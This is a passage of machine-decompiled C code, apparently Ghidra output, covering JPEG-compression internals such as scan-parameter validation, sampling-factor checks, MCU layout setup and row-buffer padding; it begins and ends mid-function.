    iVar2 = FUN_0042ee04(param_1,*(int *)(iVar3 + 0x10));
    local_14 = local_14 + iVar2;
    iVar3 = iVar3 + 0x54;
  }
  if (((param_1[0x2c] == 0) && (param_1[0x38] == 0)) && (param_1[0xd] == 8)) {
    bVar1 = true;
    iVar3 = param_1[0x10];
    for (iVar4 = 0; iVar4 < param_1[0xe]; iVar4 = iVar4 + 1) {
      if ((1 < *(int *)(iVar3 + 0x14)) || (1 < *(int *)(iVar3 + 0x18))) {
        bVar1 = false;
      }
      iVar3 = iVar3 + 0x54;
    }
    if ((local_14 != 0) && (bVar1)) {
      bVar1 = false;
      *(undefined4 *)(*param_1 + 0x14) = 0x4b;
      (**(code **)(*param_1 + 4))(param_1,0);
    }
  }
  else {
    bVar1 = false;
  }
  if (param_1[0x2c] == 0) {
    if (param_1[0x38] == 0) {
      if (bVar1) {
        FUN_0042eff4(param_1,0xc0);
      }
      else {
        FUN_0042eff4(param_1,0xc1);
      }
    }
    else {
      FUN_0042eff4(param_1,0xc2);
    }
  }
  else {
    FUN_0042eff4(param_1,0xc9);
  }
  return;
}



void FUN_0042f418(int *param_1)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int *piVar4;
  
  iVar1 = param_1[0x56];
  if (param_1[0x2c] == 0) {
    piVar4 = param_1 + 0x3d;
    for (iVar3 = 0; iVar3 < param_1[0x3c]; iVar3 = iVar3 + 1) {
      iVar2 = *piVar4;
      if (param_1[0x38] == 0) {
        FUN_0042eee8(param_1,*(int *)(iVar2 + 0x14),0);
        FUN_0042eee8(param_1,*(int *)(iVar2 + 0x18),1);
      }
      else if (param_1[0x4e] == 0) {
        if (param_1[0x50] == 0) {
          FUN_0042eee8(param_1,*(int *)(iVar2 + 0x14),0);
        }
      }
      else {
        FUN_0042eee8(param_1,*(int *)(iVar2 + 0x18),1);
      }
      piVar4 = piVar4 + 1;
    }
  }
  else {
    FUN_0042efc4();
  }
  if (*(int *)(iVar1 + 0x1c) != param_1[0x31]) {
    FUN_0042efc8(param_1);
    *(int *)(iVar1 + 0x1c) = param_1[0x31];
  }
  FUN_0042f098(param_1);
  return;
}



void FUN_0042f4e4(int *param_1)

{
  int iVar1;
  int *piVar2;
  
  FUN_0042edb8(param_1,0xd8);
  iVar1 = 0;
  piVar2 = param_1 + 0x11;
  do {
    if (*piVar2 != 0) {
      FUN_0042ee04(param_1,iVar1);
    }
    iVar1 = iVar1 + 1;
    piVar2 = piVar2 + 1;
  } while (iVar1 < 4);
  if (param_1[0x2c] == 0) {
    iVar1 = 0;
    piVar2 = param_1 + 0x15;
    do {
      if (*piVar2 != 0) {
        FUN_0042eee8(param_1,iVar1,0);
      }
      if (piVar2[4] != 0) {
        FUN_0042eee8(param_1,iVar1,1);
      }
      iVar1 = iVar1 + 1;
      piVar2 = piVar2 + 1;
    } while (iVar1 < 4);
  }
  FUN_0042edb8(param_1,0xd9);
  return;
}



void FUN_0042f55c(int param_1)

{
  code **ppcVar1;
  
  ppcVar1 = (code **)(***(code ***)(param_1 + 4))(param_1,1,0x20);
  *(code ***)(param_1 + 0x158) = ppcVar1;
  *ppcVar1 = FUN_0042f300;
  ppcVar1[1] = FUN_0042f340;
  ppcVar1[2] = FUN_0042f418;
  ppcVar1[3] = (code *)&LAB_0042f4d8;
  ppcVar1[4] = FUN_0042f4e4;
  ppcVar1[5] = FUN_0042f2c0;
  ppcVar1[6] = (code *)&LAB_0042f2f8;
  ppcVar1[7] = (code *)0x0;
  return;
}



// WARNING: Removing unreachable block (ram,0x0042f610)

void FUN_0042f5b0(int *param_1)

{
  int iVar1;
  int iVar2;
  int iVar3;
  
  if ((((param_1[8] == 0) || (param_1[7] == 0)) || (param_1[0xe] < 1)) || (param_1[9] < 1)) {
    *(undefined4 *)(*param_1 + 0x14) = 0x20;
    (**(code **)*param_1)();
  }
  if ((0xffdc < param_1[8]) || (0xffdc < param_1[7])) {
    iVar2 = *param_1;
    *(undefined4 *)(iVar2 + 0x14) = 0x29;
    *(undefined4 *)(iVar2 + 0x18) = 0xffdc;
    (**(code **)*param_1)();
  }
  if (param_1[0xd] != 8) {
    iVar2 = *param_1;
    *(undefined4 *)(iVar2 + 0x14) = 0xf;
    *(int *)(iVar2 + 0x18) = param_1[0xd];
    (**(code **)*param_1)();
  }
  if (10 < param_1[0xe]) {
    iVar2 = *param_1;
    *(undefined4 *)(iVar2 + 0x14) = 0x1a;
    *(int *)(iVar2 + 0x18) = param_1[0xe];
    *(undefined4 *)(iVar2 + 0x1c) = 10;
    (**(code **)*param_1)();
  }
  param_1[0x39] = 1;
  param_1[0x3a] = 1;
  iVar2 = param_1[0x10];
  for (iVar3 = 0; iVar3 < param_1[0xe]; iVar3 = iVar3 + 1) {
    if (((*(int *)(iVar2 + 8) < 1) || (4 < *(int *)(iVar2 + 8))) ||
       ((*(int *)(iVar2 + 0xc) < 1 || (4 < *(int *)(iVar2 + 0xc))))) {
      *(undefined4 *)(*param_1 + 0x14) = 0x12;
      (**(code **)*param_1)();
    }
    if (*(int *)(iVar2 + 8) < param_1[0x39]) {
      iVar1 = param_1[0x39];
    }
    else {
      iVar1 = *(int *)(iVar2 + 8);
    }
    param_1[0x39] = iVar1;
    if (*(int *)(iVar2 + 0xc) < param_1[0x3a]) {
      iVar1 = param_1[0x3a];
    }
    else {
      iVar1 = *(int *)(iVar2 + 0xc);
    }
    param_1[0x3a] = iVar1;
    iVar2 = iVar2 + 0x54;
  }
  iVar2 = param_1[0x10];
  for (iVar3 = 0; iVar3 < param_1[0xe]; iVar3 = iVar3 + 1) {
    *(int *)(iVar2 + 4) = iVar3;
    *(undefined4 *)(iVar2 + 0x24) = 8;
    iVar1 = FUN_0042dba8(param_1[7] * *(int *)(iVar2 + 8),param_1[0x39] << 3);
    *(int *)(iVar2 + 0x1c) = iVar1;
    iVar1 = FUN_0042dba8(param_1[8] * *(int *)(iVar2 + 0xc),param_1[0x3a] << 3);
    *(int *)(iVar2 + 0x20) = iVar1;
    iVar1 = FUN_0042dba8(param_1[7] * *(int *)(iVar2 + 8),param_1[0x39]);
    *(int *)(iVar2 + 0x28) = iVar1;
    iVar1 = FUN_0042dba8(param_1[8] * *(int *)(iVar2 + 0xc),param_1[0x3a]);
    *(int *)(iVar2 + 0x2c) = iVar1;
    *(undefined4 *)(iVar2 + 0x30) = 1;
    iVar2 = iVar2 + 0x54;
  }
  iVar2 = FUN_0042dba8(param_1[8],param_1[0x3a] << 3);
  param_1[0x3b] = iVar2;
  return;
}



void FUN_0042f774(int *param_1)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int *piVar6;
  int iVar7;
  int iVar8;
  int *local_a58;
  int local_a54;
  int local_a4c;
  int *piStack2620;
  int local_a38 [10];
  int local_a10 [640];
  
  if (param_1[0x29] < 1) {
    *(undefined4 *)(*param_1 + 0x14) = 0x13;
    *(undefined4 *)(*param_1 + 0x18) = 0;
    (**(code **)*param_1)();
  }
  local_a58 = (int *)param_1[0x2a];
  if ((local_a58[5] == 0) && (local_a58[6] == 0x3f)) {
    param_1[0x38] = 0;
    piVar6 = local_a38;
    for (local_a4c = 0; local_a4c < param_1[0xe]; local_a4c = local_a4c + 1) {
      *piVar6 = 0;
      piVar6 = piVar6 + 1;
    }
  }
  else {
    param_1[0x38] = 1;
    piVar6 = local_a10;
    for (local_a4c = 0; local_a4c < param_1[0xe]; local_a4c = local_a4c + 1) {
      iVar7 = 0;
      do {
        *piVar6 = -1;
        piVar6 = piVar6 + 1;
        iVar7 = iVar7 + 1;
      } while (iVar7 < 0x40);
    }
  }
  for (local_a54 = 1; local_a54 <= param_1[0x29]; local_a54 = local_a54 + 1) {
    iVar7 = *local_a58;
    if ((iVar7 < 1) || (4 < iVar7)) {
      iVar1 = *param_1;
      *(undefined4 *)(iVar1 + 0x14) = 0x1a;
      *(int *)(iVar1 + 0x18) = iVar7;
      *(undefined4 *)(iVar1 + 0x1c) = 4;
      (**(code **)*param_1)();
    }
    local_a4c = 0;
    piVar6 = local_a58;
    if (0 < iVar7) {
      do {
        iVar1 = piVar6[1];
        if ((iVar1 < 0) || (param_1[0xe] <= iVar1)) {
          iVar2 = *param_1;
          *(undefined4 *)(iVar2 + 0x14) = 0x13;
          *(int *)(iVar2 + 0x18) = local_a54;
          (**(code **)*param_1)();
        }
        if ((0 < local_a4c) && (iVar1 <= *piVar6)) {
          iVar1 = *param_1;
          *(undefined4 *)(iVar1 + 0x14) = 0x13;
          *(int *)(iVar1 + 0x18) = local_a54;
          (**(code **)*param_1)();
        }
        local_a4c = local_a4c + 1;
        piVar6 = piVar6 + 1;
      } while (local_a4c < iVar7);
    }
    iVar1 = local_a58[5];
    iVar2 = local_a58[6];
    iVar3 = local_a58[7];
    iVar4 = local_a58[8];
    if (param_1[0x38] == 0) {
      if ((((iVar1 != 0) || (iVar2 != 0x3f)) || (iVar3 != 0)) || (iVar4 != 0)) {
        iVar1 = *param_1;
        *(undefined4 *)(iVar1 + 0x14) = 0x11;
        *(int *)(iVar1 + 0x18) = local_a54;
        (**(code **)*param_1)();
      }
      local_a4c = 0;
      piVar6 = local_a58;
      if (0 < iVar7) {
        do {
          piVar6 = piVar6 + 1;
          iVar1 = *piVar6;
          if (local_a38[iVar1] != 0) {
            iVar2 = *param_1;
            *(undefined4 *)(iVar2 + 0x14) = 0x13;
            *(int *)(iVar2 + 0x18) = local_a54;
            (**(code **)*param_1)();
          }
          local_a38[iVar1] = 1;
          local_a4c = local_a4c + 1;
        } while (local_a4c < iVar7);
      }
    }
    else {
      if (((((iVar1 < 0) || (0x3f < iVar1)) || ((iVar2 < iVar1 || ((0x3f < iVar2 || (iVar3 < 0))))))
          || (10 < iVar3)) || ((iVar4 < 0 || (10 < iVar4)))) {
        iVar8 = *param_1;
        *(undefined4 *)(iVar8 + 0x14) = 0x11;
        *(int *)(iVar8 + 0x18) = local_a54;
        (**(code **)*param_1)();
      }
      if (iVar1 == 0) {
        if (iVar2 != 0) {
          iVar8 = *param_1;
          *(undefined4 *)(iVar8 + 0x14) = 0x11;
          *(int *)(iVar8 + 0x18) = local_a54;
          (**(code **)*param_1)();
        }
      }
      else if (iVar7 != 1) {
        iVar8 = *param_1;
        *(undefined4 *)(iVar8 + 0x14) = 0x11;
        *(int *)(iVar8 + 0x18) = local_a54;
        (**(code **)*param_1)();
      }
      local_a4c = 0;
      piStack2620 = local_a58;
      if (0 < iVar7) {
        do {
          piStack2620 = piStack2620 + 1;
          iVar8 = *piStack2620;
          if ((iVar1 != 0) && (local_a10[iVar8 * 0x40] < 0)) {
            iVar5 = *param_1;
            *(undefined4 *)(iVar5 + 0x14) = 0x11;
            *(int *)(iVar5 + 0x18) = local_a54;
            (**(code **)*param_1)();
          }
          piVar6 = local_a10 + iVar8 * 0x40 + iVar1;
          for (iVar8 = iVar1; iVar8 <= iVar2; iVar8 = iVar8 + 1) {
            if (*piVar6 < 0) {
              if (iVar3 != 0) {
                iVar5 = *param_1;
                *(undefined4 *)(iVar5 + 0x14) = 0x11;
                *(int *)(iVar5 + 0x18) = local_a54;
                (**(code **)*param_1)();
              }
            }
            else if ((iVar3 != *piVar6) || (iVar3 + -1 != iVar4)) {
              iVar5 = *param_1;
              *(undefined4 *)(iVar5 + 0x14) = 0x11;
              *(int *)(iVar5 + 0x18) = local_a54;
              (**(code **)*param_1)();
            }
            *piVar6 = iVar4;
            piVar6 = piVar6 + 1;
          }
          local_a4c = local_a4c + 1;
        } while (local_a4c < iVar7);
      }
    }
    local_a58 = local_a58 + 9;
  }
  if (param_1[0x38] == 0) {
    piVar6 = local_a38;
    for (local_a4c = 0; local_a4c < param_1[0xe]; local_a4c = local_a4c + 1) {
      if (*piVar6 == 0) {
        *(undefined4 *)(*param_1 + 0x14) = 0x2d;
        (**(code **)*param_1)();
      }
      piVar6 = piVar6 + 1;
    }
  }
  else {
    piVar6 = local_a10;
    for (local_a4c = 0; local_a4c < param_1[0xe]; local_a4c = local_a4c + 1) {
      if (*piVar6 < 0) {
        *(undefined4 *)(*param_1 + 0x14) = 0x2d;
        (**(code **)*param_1)();
      }
      piVar6 = piVar6 + 0x40;
    }
  }
  return;
}



void FUN_0042fb5c(int *param_1)

{
  int iVar1;
  int *piVar2;
  int *piVar3;
  int *piVar4;
  
  if (param_1[0x2a] == 0) {
    if (4 < param_1[0xe]) {
      iVar1 = *param_1;
      *(undefined4 *)(iVar1 + 0x14) = 0x1a;
      *(int *)(iVar1 + 0x18) = param_1[0xe];
      *(undefined4 *)(iVar1 + 0x1c) = 4;
      (**(code **)*param_1)();
    }
    param_1[0x3c] = param_1[0xe];
    piVar4 = param_1 + 0x3d;
    for (iVar1 = 0; iVar1 < param_1[0xe]; iVar1 = iVar1 + 1) {
      *piVar4 = iVar1 * 0x54 + param_1[0x10];
      piVar4 = piVar4 + 1;
    }
    param_1[0x4e] = 0;
    param_1[0x4f] = 0x3f;
    param_1[0x50] = 0;
    param_1[0x51] = 0;
  }
  else {
    piVar4 = param_1 + 0x3d;
    piVar2 = (int *)(*(int *)(param_1[0x52] + 0x20) * 0x24 + param_1[0x2a]);
    param_1[0x3c] = *piVar2;
    piVar3 = piVar2;
    for (iVar1 = 0; piVar3 = piVar3 + 1, iVar1 < *piVar2; iVar1 = iVar1 + 1) {
      *piVar4 = *piVar3 * 0x54 + param_1[0x10];
      piVar4 = piVar4 + 1;
    }
    param_1[0x4e] = piVar2[5];
    param_1[0x4f] = piVar2[6];
    param_1[0x50] = piVar2[7];
    param_1[0x51] = piVar2[8];
  }
  return;
}



void FUN_0042fc4c(int *param_1)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  int iVar4;
  int *local_10;
  
  if (param_1[0x3c] == 1) {
    iVar2 = param_1[0x3d];
    param_1[0x41] = *(int *)(iVar2 + 0x1c);
    param_1[0x42] = *(int *)(iVar2 + 0x20);
    *(undefined4 *)(iVar2 + 0x34) = 1;
    *(undefined4 *)(iVar2 + 0x38) = 1;
    *(undefined4 *)(iVar2 + 0x3c) = 1;
    *(undefined4 *)(iVar2 + 0x40) = 8;
    *(undefined4 *)(iVar2 + 0x44) = 1;
    uVar3 = *(uint *)(iVar2 + 0x20) % *(uint *)(iVar2 + 0xc);
    if (uVar3 == 0) {
      uVar3 = *(uint *)(iVar2 + 0xc);
    }
    *(uint *)(iVar2 + 0x48) = uVar3;
    param_1[0x43] = 1;
    param_1[0x44] = 0;
  }
  else {
    if ((param_1[0x3c] < 1) || (4 < param_1[0x3c])) {
      iVar2 = *param_1;
      *(undefined4 *)(iVar2 + 0x14) = 0x1a;
      *(int *)(iVar2 + 0x18) = param_1[0x3c];
      *(undefined4 *)(iVar2 + 0x1c) = 4;
      (**(code **)*param_1)();
    }
    iVar2 = FUN_0042dba8(param_1[7],param_1[0x39] << 3);
    param_1[0x41] = iVar2;
    iVar2 = FUN_0042dba8(param_1[8],param_1[0x3a] << 3);
    param_1[0x42] = iVar2;
    param_1[0x43] = 0;
    local_10 = param_1 + 0x3d;
    for (iVar2 = 0; iVar2 < param_1[0x3c]; iVar2 = iVar2 + 1) {
      iVar4 = *local_10;
      *(undefined4 *)(iVar4 + 0x34) = *(undefined4 *)(iVar4 + 8);
      *(int *)(iVar4 + 0x38) = *(int *)(iVar4 + 0xc);
      *(int *)(iVar4 + 0x3c) = *(int *)(iVar4 + 0x34) * *(int *)(iVar4 + 0xc);
      *(int *)(iVar4 + 0x40) = *(int *)(iVar4 + 0x34) << 3;
      uVar3 = *(uint *)(iVar4 + 0x1c) % *(uint *)(iVar4 + 0x34);
      if (uVar3 == 0) {
        uVar3 = *(uint *)(iVar4 + 0x34);
      }
      *(uint *)(iVar4 + 0x44) = uVar3;
      uVar3 = *(uint *)(iVar4 + 0x20) % *(uint *)(iVar4 + 0x38);
      if (uVar3 == 0) {
        uVar3 = *(uint *)(iVar4 + 0x38);
      }
      *(uint *)(iVar4 + 0x48) = uVar3;
      iVar4 = *(int *)(iVar4 + 0x3c);
      if (10 < param_1[0x43] + iVar4) {
        *(undefined4 *)(*param_1 + 0x14) = 0xd;
        (**(code **)*param_1)();
      }
      while( true ) {
        if (iVar4 < 1) break;
        iVar1 = param_1[0x43];
        param_1[0x43] = param_1[0x43] + 1;
        param_1[iVar1 + 0x44] = iVar2;
        iVar4 = iVar4 + -1;
      }
      local_10 = local_10 + 1;
    }
  }
  if (0 < param_1[0x32]) {
    iVar2 = param_1[0x32] * param_1[0x41];
    if (0xfffe < iVar2) {
      iVar2 = 0xffff;
    }
    param_1[0x31] = iVar2;
  }
  return;
}



void FUN_0042fdf8(int *param_1)

{
  int iVar1;
  int iVar2;
  undefined4 uVar3;
  
  iVar1 = param_1[0x52];
  iVar2 = *(int *)(iVar1 + 0x14);
  if (iVar2 == 0) {
    FUN_0042fb5c(param_1);
    FUN_0042fc4c(param_1);
    if (param_1[0x2b] == 0) {
      (**(code **)param_1[0x57])();
      (**(code **)param_1[0x58])();
      (**(code **)param_1[0x54])(param_1,0);
    }
    (**(code **)param_1[0x59])();
    (**(code **)param_1[0x5a])(param_1,param_1[0x2d]);
    if (*(int *)(iVar1 + 0x1c) < 2) {
      uVar3 = 0;
    }
    else {
      uVar3 = 3;
    }
    (**(code **)param_1[0x55])(param_1,uVar3);
    (**(code **)param_1[0x53])(param_1,0);
    if (param_1[0x2d] == 0) {
      *(undefined4 *)(iVar1 + 0xc) = 1;
    }
    else {
      *(undefined4 *)(iVar1 + 0xc) = 0;
    }
  }
  else {
    if (iVar2 == 1) {
      FUN_0042fb5c(param_1);
      FUN_0042fc4c(param_1);
      if (((param_1[0x4e] != 0) || (param_1[0x50] == 0)) || (param_1[0x2c] != 0)) {
        (**(code **)param_1[0x5a])(param_1,1);
        (**(code **)param_1[0x55])(param_1,2);
        *(undefined4 *)(iVar1 + 0xc) = 0;
        goto LAB_0042ff6d;
      }
      *(undefined4 *)(iVar1 + 0x14) = 2;
      *(int *)(iVar1 + 0x18) = *(int *)(iVar1 + 0x18) + 1;
    }
    else if (iVar2 != 2) {
      *(undefined4 *)(*param_1 + 0x14) = 0x30;
      (**(code **)*param_1)();
      goto LAB_0042ff6d;
    }
    if (param_1[0x2d] == 0) {
      FUN_0042fb5c(param_1);
      FUN_0042fc4c(param_1);
    }
    (**(code **)param_1[0x5a])(param_1,0);
    (**(code **)param_1[0x55])(param_1,2);
    if (*(int *)(iVar1 + 0x20) == 0) {
      (**(code **)(param_1[0x56] + 4))();
    }
    (**(code **)(param_1[0x56] + 8))();
    *(undefined4 *)(iVar1 + 0xc) = 0;
  }
LAB_0042ff6d:
  *(uint *)(iVar1 + 0x10) = (uint)(*(int *)(iVar1 + 0x1c) + -1 == *(int *)(iVar1 + 0x18));
  iVar2 = param_1[2];
  if (iVar2 != 0) {
    *(undefined4 *)(iVar2 + 0xc) = *(undefined4 *)(iVar1 + 0x18);
    *(undefined4 *)(iVar2 + 0x10) = *(undefined4 *)(iVar1 + 0x1c);
  }
  return;
}



void FUN_0042ff94(int param_1)

{
  *(undefined4 *)(*(int *)(param_1 + 0x148) + 0xc) = 0;
  (**(code **)(*(int *)(param_1 + 0x158) + 4))();
  (**(code **)(*(int *)(param_1 + 0x158) + 8))();
  return;
}



void FUN_0042ffbc(int param_1)

{
  int iVar1;
  int iVar2;
  
  iVar1 = *(int *)(param_1 + 0x148);
  (**(code **)(*(int *)(param_1 + 0x168) + 8))();
  iVar2 = *(int *)(iVar1 + 0x14);
  if (iVar2 == 0) {
    *(undefined4 *)(iVar1 + 0x14) = 2;
    if (*(int *)(param_1 + 0xb4) == 0) {
      *(int *)(iVar1 + 0x20) = *(int *)(iVar1 + 0x20) + 1;
    }
  }
  else if (iVar2 == 1) {
    *(undefined4 *)(iVar1 + 0x14) = 2;
  }
  else if (iVar2 == 2) {
    if (*(int *)(param_1 + 0xb4) != 0) {
      *(undefined4 *)(iVar1 + 0x14) = 1;
    }
    *(int *)(iVar1 + 0x20) = *(int *)(iVar1 + 0x20) + 1;
  }
  *(int *)(iVar1 + 0x18) = *(int *)(iVar1 + 0x18) + 1;
  return;
}



void FUN_00430018(int *param_1,int param_2)

{
  code **ppcVar1;
  
  ppcVar1 = (code **)(**(code **)param_1[1])(param_1,1,0x24);
  param_1[0x52] = (int)ppcVar1;
  *ppcVar1 = FUN_0042fdf8;
  ppcVar1[1] = FUN_0042ff94;
  ppcVar1[2] = FUN_0042ffbc;
  ppcVar1[4] = (code *)0x0;
  FUN_0042f5b0(param_1);
  if (param_1[0x2a] == 0) {
    param_1[0x38] = 0;
    param_1[0x29] = 1;
  }
  else {
    FUN_0042f774(param_1);
  }
  if (param_1[0x38] != 0) {
    param_1[0x2d] = 1;
  }
  if (param_2 == 0) {
    ppcVar1[5] = (code *)0x0;
  }
  else if (param_1[0x2d] == 0) {
    ppcVar1[5] = (code *)0x2;
  }
  else {
    ppcVar1[5] = (code *)0x1;
  }
  ppcVar1[8] = (code *)0x0;
  ppcVar1[6] = (code *)0x0;
  if (param_1[0x2d] == 0) {
    ppcVar1[7] = (code *)param_1[0x29];
  }
  else {
    ppcVar1[7] = (code *)(param_1[0x29] * 2);
  }
  return;
}



void FUN_00430120(int param_1,undefined4 param_2,int *param_3,undefined4 param_4)

{
  int iVar1;
  int iVar2;
  
  iVar1 = *(int *)(param_1 + 0x14c);
  while( true ) {
    if (*(uint *)(param_1 + 0xec) <= *(uint *)(iVar1 + 8)) {
      return;
    }
    if (*(uint *)(iVar1 + 0xc) < 8) {
      (**(code **)(*(int *)(param_1 + 0x150) + 4))
                (param_1,param_2,param_3,8,iVar1 + 0xc,iVar1 + 0x18,param_4);
    }
    if (*(int *)(iVar1 + 0xc) != 8) break;
    iVar2 = (**(code **)(*(int *)(param_1 + 0x154) + 4))(param_1,iVar1 + 0x18);
    if (iVar2 == 0) {
      if (*(int *)(iVar1 + 0x10) != 0) {
        return;
      }
      *param_3 = *param_3 + -1;
      *(undefined4 *)(iVar1 + 0x10) = 1;
      return;
    }
    if (*(int *)(iVar1 + 0x10) != 0) {
      *param_3 = *param_3 + 1;
      *(undefined4 *)(iVar1 + 0x10) = 0;
    }
    *(undefined4 *)(iVar1 + 0xc) = 0;
    *(int *)(iVar1 + 8) = *(int *)(iVar1 + 8) + 1;
  }
  return;
}



void FUN_004301b8(int *param_1,int param_2,undefined4 param_3)

{
  undefined4 *puVar1;
  undefined4 uVar2;
  int iVar3;
  int iVar4;
  
  puVar1 = (undefined4 *)(**(code **)param_1[1])(param_1,1,0x40,param_3);
  param_1[0x53] = (int)puVar1;
  *puVar1 = &LAB_004300e0;
  if (param_1[0x2b] == 0) {
    if (param_2 == 0) {
      puVar1 = puVar1 + 6;
      iVar3 = param_1[0x10];
      for (iVar4 = 0; iVar4 < param_1[0xe]; iVar4 = iVar4 + 1) {
        uVar2 = (**(code **)(param_1[1] + 8))
                          (param_1,1,*(int *)(iVar3 + 0x1c) << 3,*(int *)(iVar3 + 0xc) << 3);
        *puVar1 = uVar2;
        puVar1 = puVar1 + 1;
        iVar3 = iVar3 + 0x54;
      }
    }
    else {
      *(undefined4 *)(*param_1 + 0x14) = 4;
      (**(code **)*param_1)();
    }
  }
  return;
}



void FUN_0043023c(int *param_1,int param_2)

{
  int iVar1;
  
  iVar1 = param_1[0x54];
  if (param_2 != 0) {
    *(undefined4 *)(*param_1 + 0x14) = 4;
    (**(code **)*param_1)();
  }
  *(int *)(iVar1 + 0x30) = param_1[8];
  *(undefined4 *)(iVar1 + 0x34) = 0;
  *(undefined4 *)(iVar1 + 0x38) = 0;
  *(int *)(iVar1 + 0x3c) = param_1[0x3a] * 2;
  return;
}



void FUN_00430278(undefined4 param_1,undefined4 param_2,int param_3,int param_4)

{
  int iVar1;
  
  iVar1 = param_3;
  if (param_3 < param_4) {
    do {
      FUN_0042dbd0((undefined)param_1,(char)param_3 + -1,(undefined)param_1,param_2,1,iVar1);
      iVar1 = iVar1 + 1;
    } while (iVar1 < param_4);
  }
  return;
}



void FUN_004302b0(int param_1,int param_2,uint *param_3,uint param_4,uint *param_5,
                 undefined4 *param_6,uint param_7)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  int iVar4;
  undefined4 *local_18;
  undefined4 *local_14;
  
  iVar3 = *(int *)(param_1 + 0x150);
  while( true ) {
    if (param_7 <= *param_3) {
      return;
    }
    if (param_4 <= *param_5) break;
    uVar1 = *(int *)(param_1 + 0xe8) - *(int *)(iVar3 + 0x34);
    uVar2 = param_7 - *param_3;
    if (uVar1 < uVar2) {
      uVar2 = uVar1;
    }
    (**(code **)(*(int *)(param_1 + 0x15c) + 4))
              (param_1,*param_3 * 4 + param_2,iVar3 + 8,uVar2,*(undefined4 *)(iVar3 + 0x34));
    *param_3 = *param_3 + uVar2;
    *(int *)(iVar3 + 0x34) = *(int *)(iVar3 + 0x34) + uVar2;
    *(int *)(iVar3 + 0x30) = *(int *)(iVar3 + 0x30) - uVar2;
    if ((*(int *)(iVar3 + 0x30) == 0) && (*(int *)(iVar3 + 0x34) < *(int *)(param_1 + 0xe8))) {
      local_14 = (undefined4 *)(iVar3 + 8);
      for (iVar4 = 0; iVar4 < *(int *)(param_1 + 0x38); iVar4 = iVar4 + 1) {
        FUN_00430278(*local_14,*(undefined4 *)(param_1 + 0x1c),*(int *)(iVar3 + 0x34),
                     *(int *)(param_1 + 0xe8));
        local_14 = local_14 + 1;
      }
      *(undefined4 *)(iVar3 + 0x34) = *(undefined4 *)(param_1 + 0xe8);
    }
    if (*(int *)(iVar3 + 0x34) == *(int *)(param_1 + 0xe8)) {
      (**(code **)(*(int *)(param_1 + 0x160) + 4))(param_1,iVar3 + 8,0,*param_5,param_6);
      *(undefined4 *)(iVar3 + 0x34) = 0;
      *param_5 = *param_5 + 1;
    }
    if ((*(int *)(iVar3 + 0x30) == 0) && (*param_5 < param_4)) {
      iVar3 = *(int *)(param_1 + 0x40);
      local_18 = param_6;
      for (iVar4 = 0; iVar4 < *(int *)(param_1 + 0x38); iVar4 = iVar4 + 1) {
        FUN_00430278(*local_18,*(int *)(iVar3 + 0x1c) << 3,*param_5 * *(int *)(iVar3 + 0xc),
                     *(int *)(iVar3 + 0xc) * param_4);
        local_18 = local_18 + 1;
        iVar3 = iVar3 + 0x54;
      }
      *param_5 = param_4;
      return;
    }
  }
  return;
}



void FUN_00430410(int param_1,int param_2,uint *param_3,uint param_4,uint *param_5,
                 undefined4 param_6,uint param_7)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  undefined4 *puVar5;
  int iVar6;
  undefined4 *local_20;
  int local_18;
  
  iVar1 = *(int *)(param_1 + 0x150);
  iVar2 = *(int *)(param_1 + 0xe8) * 3;
  do {
    if (param_4 <= *param_5) {
      return;
    }
    if (*param_3 < param_7) {
      uVar3 = *(int *)(iVar1 + 0x3c) - *(int *)(iVar1 + 0x34);
      uVar4 = param_7 - *param_3;
      if (uVar3 < uVar4) {
        uVar4 = uVar3;
      }
      (**(code **)(*(int *)(param_1 + 0x15c) + 4))
                (param_1,*param_3 * 4 + param_2,iVar1 + 8,uVar4,*(undefined4 *)(iVar1 + 0x34));
      if (*(int *)(param_1 + 0x20) == *(int *)(iVar1 + 0x30)) {
        local_20 = (undefined4 *)(iVar1 + 8);
        for (local_18 = 0; local_18 < *(int *)(param_1 + 0x38); local_18 = local_18 + 1) {
          for (iVar6 = 1; iVar6 <= *(int *)(param_1 + 0xe8); iVar6 = iVar6 + 1) {
            FUN_0042dbd0((char)*local_20,0,(char)*local_20,*(undefined4 *)(param_1 + 0x1c),1,-iVar6)
            ;
          }
          local_20 = local_20 + 1;
        }
      }
      *param_3 = *param_3 + uVar4;
      *(int *)(iVar1 + 0x34) = *(int *)(iVar1 + 0x34) + uVar4;
      *(int *)(iVar1 + 0x30) = *(int *)(iVar1 + 0x30) - uVar4;
    }
    else {
      if (*(int *)(iVar1 + 0x30) != 0) {
        return;
      }
      if (*(int *)(iVar1 + 0x34) < *(int *)(iVar1 + 0x3c)) {
        puVar5 = (undefined4 *)(iVar1 + 8);
        for (local_18 = 0; local_18 < *(int *)(param_1 + 0x38); local_18 = local_18 + 1) {
          FUN_00430278(*puVar5,*(undefined4 *)(param_1 + 0x1c),*(int *)(iVar1 + 0x34),
                       *(int *)(iVar1 + 0x3c));
          puVar5 = puVar5 + 1;
        }
        *(undefined4 *)(iVar1 + 0x34) = *(undefined4 *)(iVar1 + 0x3c);
      }
    }
    if (*(int *)(iVar1 + 0x34) == *(int *)(iVar1 + 0x3c)) {
      (**(code **)(*(int *)(param_1 + 0x160) + 4))
                (param_1,iVar1 + 8,*(undefined4 *)(iVar1 + 0x38),*param_5,param_6);
      *param_5 = *param_5 + 1;
      *(int *)(iVar1 + 0x38) = *(int *)(iVar1 + 0x38) + *(int *)(param_1 + 0xe8);
      if (iVar2 <= *(int *)(iVar1 + 0x38)) {
        *(undefined4 *)(iVar1 + 0x38) = 0;
      }
      if (iVar2 <= *(int *)(iVar1 + 0x34)) {
        *(undefined4 *)(iVar1 + 0x34) = 0;
      }
      *(int *)(iVar1 + 0x3c) = *(int *)(param_1 + 0xe8) + *(int *)(iVar1 + 0x34);
    }
  } while( true );
}



void FUN_004305b8(int param_1)

{
  int iVar1;
  int iVar2;
  undefined4 uVar3;
  undefined4 *puVar4;
  int iVar5;
  undefined extraout_CL;
  undefined4 *puVar6;
  undefined4 *puVar7;
  int iStack32;
  int iStack28;
  undefined4 *puStack24;
  undefined4 *puStack20;
  
  iVar5 = *(int *)(param_1 + 0x150);
  iVar2 = *(int *)(param_1 + 0xe8);
  puStack24 = (undefined4 *)
              (***(code ***)(param_1 + 4))(param_1,1,*(int *)(param_1 + 0x38) * iVar2 * 0x14);
  iStack32 = 0;
